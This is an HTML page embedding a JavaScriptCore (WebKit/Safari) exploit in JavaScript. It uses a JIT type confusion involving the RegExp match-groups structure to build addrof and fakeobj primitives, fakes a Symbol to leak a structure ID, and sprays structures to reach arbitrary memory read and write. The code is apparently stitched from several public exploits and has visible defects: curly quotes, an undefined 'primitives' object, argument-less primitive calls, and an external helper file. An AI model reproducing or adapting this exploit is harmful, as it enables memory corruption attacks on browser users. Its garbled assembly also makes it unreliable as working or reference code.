<script src=“utils.js”>
<script>
//let print = alert;
var ALLOCS = 1000
let convert = new ArrayBuffer(0x8);
let f64 = new Float64Array(convert);
let u32 = new Uint32Array(convert);
let i32 = u32;
let BASE = 0x100000000;
function i2f(x) {
      u32[0] = x % BASE;
      u32[1] = (x - (x % BASE)) / BASE;
      return f64[0];
}
function f2i(x) {
      f64[0] = x;
      return u32[0] + BASE * u32[1];
}
function i2jsv(x) {
    u32[0] = (x % BASE);
    u32[1] = ((x - (x % BASE)) / BASE) - 0x10000;
    return f64[0];
}
function hex(x) {
      return `0x${x.toString(16)}`
}
function pf(x) {
    print(hex(f2i(x)));
}
function ph(x) {
    print(hex(x));
}
function gc() {
      for (let i = 0; i < 0x10; i++) {
              new ArrayBuffer(0x1000000);
          }
}
// /System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc poc.js
// The PoC will confuse objX with objY.
// objX will have structure S1, objY structure S2.
//let objX = {objProperty: {fetchme: [1.1]}};
//let objY = {doublePropety: [2.2]};             // 0x4141414141414141 in memory
//let target = [1.1,2.2,3.3];
let objX = {objProperty: {fetchme : 0x1234}};
let objY = {doubleProperty: []};
let victim5 = [1.1, 2.2, 3.3, 4.4, 5.5];
let structs = [];
for (let i = 0; i < 0x1000; i++) {
    var tmp = [1.1];
    tmp.pointer = i2f(0x1234);
    tmp['spray' + i.toString()] = 3.3;
    structs.push(tmp);
}
// Create a plain array with indexing type SlowPutArrayStorage. This is equivalent to
// `arrayStructureForIndexingTypeDuringAllocation(ArrayWithSlowPutArrayStorage)` in C++.
function createArrayWithSlowPutArrayStorage() {
    let protoWithIndexedAccessors = {};
    Object.defineProperty(protoWithIndexedAccessors, 1337, { get() { return 1337; } });
    // Compile a function that will end up creating an array with SlowPutArrayStorage.
    function helper(i) {
        // After JIT compilation, this new Array call will construct a normal array (with the
        // original Array prototype) with SlowPutArrayStorage due to profiling information from
        // previous executions (which all ended up transitioning to SlowPutArrayStorage).
        let a = new Array;
        if (i > 0) {
            // Convert the array to SlowPutArrayStorage by installing a prototype with indexed
            // accessors. This object can, however, not be used directly as the prototype is
            // different and thus the structure has changed.
            Object.setPrototypeOf(a, protoWithIndexedAccessors);
        }
        return a;
    }
    for (let i = 1; i < 10000; i++) {
        helper(i);
    }
    return helper(0);
}
// Helper object using inferred types.
let obj = {};
obj.inlineProperty1 = 1337;
obj.inlineProperty2 = 1338;
obj.oolProperty1 = objX;        // Inferred type of 'oolProperty1' will be ObjectWithStructure S1.
// 'obj' now has structure S3.
// Create the same structure (S4) that will later (when having a bad time) be used as
// regExpMatchesArrayWithGroupsStructure. Since property values are assigned during the initial
// structure transition, inferred types for all property values are created.
let a = createArrayWithSlowPutArrayStorage();       // a has Structure S4,
a.index = 42;                                       // S5,
a.input = "foobar";                                 // S6,
a.groups = obj;                                     // and S7.
// The inferred type for the .groups property will be ObjectWithStructure S3.
// Inferred type for this property will be ObjectWithStructure S7.
global = a;
// Must assign twice so the JIT uses the inferred type instead of assuming that
// the property is constant and installing a replacement watchpoint to
// deoptimize whenever the property is replaced.
global = a;
// Have a bad time. This will attempt to recreate the global regExpMatchesArrayWithGroupsStructure
// (to use an array with SlowPutArrayStorage), but since the same structure transitions were
// performed before, it will actually reuse the existing structure S7. As no property values are
// assigned, all inferred types for structure S7 will still be valid.
Object.defineProperty(Array.prototype, 1337, { get() { return 1337; } });
// Compile a function that uses the inferred value of 'global' to omit type checks.
function hax(val) {
  var re = global.groups.oolProperty1.objProperty.fetchme;
  global.groups.oolProperty1.objProperty.fetchme = val;
  return re;
}
for (let i = 0; i < 10000; i++) {
    hax(i2jsv(0x0108211700001001 + i));
}
// Create an ObjectWithStructure S7 which violates the inferred type of .groups (and potentially
// other properties) due to createRegExpMatchesArray using putDirect.
let match = "hax".match(/(?<oolProperty1>hax)/);
// match.groups has structure S8 and so assignments to it won't invalidate inferred types of S7.
match.groups.oolProperty1 = objY;       // This property overlaps with oolProperty1 of structure S3.
// The inferred type for 'global' is ObjectWithStructure S4 so watchpoints will not be fired.
global = match;
// backup original structure
let backup = hax(1);
let addrof = function (obj) {
  hax(backup);
  victim5[0] = obj;
  hax(i2jsv(0x0108211700001000));
  return victim5[2];
}
let fakeobj = function (addr) {
  hax(i2jsv(0x0108211700001000));
    victim5[2] = addr;
    hax(backup);
  return victim5[0];
}
var primitives;
primitives.addrof = addrof();
primitives.fakeobj = fakeobj();
let stage1 = primitives;

//
// As a public technique to bypass such mitigation has been released, I think
// it's time to update this exploit to reflect the changes accordingly.
//
function leakStructureId(victimObj) {
    var symbolCellHeader = new Int64([
        0x00, 0x00, 0x00, 0x00,
        0x0,
        0x2,
        0x10,
        0x1
    ]);

    var lengthAndFlag = new Int64([
        0x02, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x00, 0x00
    ]);

    var container = {
        jsCellHeader: symbolCellHeader.asJSValue(),
        m_uid: null,
        length_flag: lengthAndFlag.asDouble(),
        description: victimObj
    };

    var containerAddr = addrof(container);
    var fakeSymbolAddr = Add(containerAddr, 0x10);
    var fakeStringAddr = Add(fakeSymbolAddr, 0x10);

    var fakeString = fakeobj(fakeStringAddr.asDouble());

    container.m_uid = fakeString;

    var fakeSymbol = fakeobj(fakeSymbolAddr.asDouble());

    var structureId = "";
    var symbolDescription = Symbol.prototype.toString.call(fakeSymbol);
    for (var i = 0; i < 2; ++i)
        structureId += ("0000" + symbolDescription.charCodeAt(8 - i).toString(16)).slice(-4);

    return structureId.match(/.{1,2}/g).map(x => "0x" + x).reverse();
}
/*
var structs = [];

function sprayStructures() {
    for (var i = 0; i < 1000; i++) {
        var a = [13.37];
        a['prop'] = 13.37;
        a['prop' + i] = 13.37;
        structs.push(a);
    }
}
*/
function pwn() {
    alert(“starting”);
   // sprayStructures();

    var targetArray = new Array();
    var structureid = leakStructureId(targetArray);
    alert(structureid);
// post spectre & gigacage compatible
    // however, memory rw is backed by normal js objects and not typed
    // arrays, and is less reliable

    // "normal" arrays store values in butterfly, and typed arrays store
    // their values in m_vector.
    // butterfly is not cached, but vector is -- so until gigacage is
    // killed old-style typed arrays can't be used for rw primitive

    // first property offset
    var FPO = typeof(SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;

    var structure_spray = []
    for (var i = 0; i < 1000; ++i) {
        // last property is 0xfffffff because we want that value to
        // preceed the manager, so when manager gets reused as
        // butterfly, it's vectorLength is big enough
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
        ary['prop'+i] = 1
        structure_spray.push(ary)
    }

    var manager = structure_spray[500]
    var leak_addr = addrof(manager)
    //print('leaking from: '+ hex(leak_addr))

    // properties are stored in butterfly to the right of pointer
    // so when we create a fake object with butterfly pointing to
    // manager, we would be only able to access memory which lies after
    // the manager, since we can't reliably access properties: we don't
    // even know structure layout we'd end up using, see get_mem_old's
    // instanceof loop for more info
    function alloc_above_manager(expr) {
        var res
        do {
            for (var i = 0; i < ALLOCS; ++i) {
                structure_spray.push(eval(expr))
            }
            res = eval(expr)
        } while (addrof(res) < leak_addr)
        return res
    }

    var unboxed_size = 100

    // Two arrays are created: unboxed and boxed
    // their butterflies are then set to same value
    // so unboxed[i] would point to same memory as boxed[i]
    // this leads to easy type confusion:
    // JSValue (inc. pointers) with floats
    // see saelo's phrack article, look for "JSC defines a set of
    // different indexing types".
    // JSC sees huge array containing only floats, so they'd be stored
    // as floats and retrived as floats, not as normal JSValue's
    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
    // this one would have indexing type of array with objects in it
    var boxed = alloc_above_manager('[{}]')
    var victim = alloc_above_manager('[]')

    // Will be stored out-of-line at butterfly - 0x10
    victim.p0 = 0x1337
    function victim_write(val) {
        victim.p0 = val
    }
    function victim_read() {
        return victim.p0
    }

    i32[0] = 0x200               // Structure ID
    i32[1] = 0x01082007 - 0x10000 // Fake JSCell metadata, adjusted for boxing
    var outer = {
        p0: 0, // Padding, so that the rest of inline properties are 16-byte aligned
        p1: f64[0],
        p2: manager,
        // parts of spectre mitigation, but just won't be used on older
        // versions
        p3: 0xfffffff, // Butterfly indexing mask
    }

    // this would cause p1 to be interpreted as an object
    // with p2==manager==leak_addr being used as butterfly
    var fake_addr = addrof(outer) + FPO + 0x8
    //print('fake obj @ ' + hex(fake_addr))

    var unboxed_addr = addrof(unboxed)
    var boxed_addr = addrof(boxed)
    var victim_addr = addrof(victim)
    /*alert('leak ' + hex(leak_addr)
        + '\nunboxed ' + hex(unboxed_addr)
        + '\nboxed ' + hex(boxed_addr)
        + '\nvictim ' + hex(victim_addr))
*/
    var holder = {fake: {}}
    holder.fake = fakeobj(fake_addr)

    // From here on GC would be uncool

    // Share a butterfly for easier boxing/unboxing
    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)

    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
    function set_victim_addr(where) {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10)
    }
    function reset_victim_addr() {
        holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly
    }

    var stage2 = {
        addrof: function(victim) {
            boxed[0] = victim
            return f2i(unboxed[0])
        },

        fakeobj: function(addr) {
            unboxed[0] = (new Int64(addr)).asDouble()
            return boxed[0]
        },

        write64: function(where, what) {
            set_victim_addr(where)
            victim_write(this.fakeobj(what))
            reset_victim_addr()
        },

        read64: function(where) {
            set_victim_addr(where)
            var res = this.addrof(victim_read())
            reset_victim_addr()
            return res
        },

        writeInt64: function(where, what) {
            set_victim_addr(where)
            victim_write(this.fakeobj(f2i(what.asDouble())))
            reset_victim_addr()
        },

        readInt64: function(where) {
            set_victim_addr(where)
            var res = this.addrof(victim_read())
            reset_victim_addr()
            return new Int64(res)
        },

        read: function(addr, length) {
            var a = new Array(length);
            var i;

            for (i = 0; i + 8 < length; i += 8) {
                v = this.readInt64(addr + i).bytes()
                for (var j = 0; j < 8; j++) {
                    a[i+j] = v[j];
                }
            }

            v = this.readInt64(addr + i).bytes()
            for (var j = i; j < length; j++) {
                a[j] = v[j - i];
            }

            return a
        },

        write: function(addr, data) {
            throw 'maybe later'
        },
    }
alert(“done”)

}
let fail = function(x)
    {
        alert('FAIL: ' + x);
        location.reload();
        throw null;
    }

alert(“...”)
try {
pwn();
} catch (e) {
fail('Error: ' + e + (e != null ? '\n' + e.stack : ''));
}
</script>
